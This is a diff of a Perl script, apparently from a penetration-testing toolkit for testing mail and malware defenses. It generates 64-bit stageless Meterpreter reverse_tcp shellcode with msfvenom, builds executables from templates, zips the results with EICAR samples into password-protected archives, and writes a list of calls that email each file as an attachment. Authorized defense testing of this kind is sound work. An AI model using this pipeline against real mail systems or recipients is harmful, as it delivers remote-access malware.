@@ -460,11 +460,12 @@ TCPSTAGELESS64
   `$cmd`;
 
   $scriptNum ="165";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.exe";
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(1189423,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
   `echo $scriptName >>$batchfile`;
 
 
@@ -507,11 +508,12 @@ TCPSTAGELESS64
   `$cmd`;
 
   $scriptNum ="175";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.exe";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter  C Shell Code: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(1189543,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
   `echo $scriptName >>$batchfile`;
 
   $payload = 'windows/x64/meterpreter/reverse_tcp';
@@ -703,9 +705,22 @@ BAPENC2
   `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
   `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
   `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;
-  print "enter 123 for the password\n\n";
-  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEnc-pw123.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e `;
+  print "***Set 123 for the password\n\n";
+  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEnc-pw123.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e --pasword 123`;
 
+  $targetFolder = "/opt/malwaredefense/current";
+  open (OUTPUT, ">","$targetFolder/998-EmailList.txt");
+  opendir (DIR, $targetFolder) or die $!;
+  my @files = sort readdir(DIR);
+  while (my $originalFile = shift(@files)) {
+    $_ = $originalFile;
+    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/ ||/ba_$/ ||/bat$/){next;}
+    print OUTPUT "\t\$testName = \$fileName = '${originalFile}';\n";
+    print OUTPUT "\t\$testDescription='This is a test';\n";
+    print OUTPUT "\tsendAttachment(\$mail,\$testName,\$testDescription,\$fileName,\$customer,\$project);\n\n";
+  }
+  closedir(DIR);
+  close(OUTPUT);
 
 
 
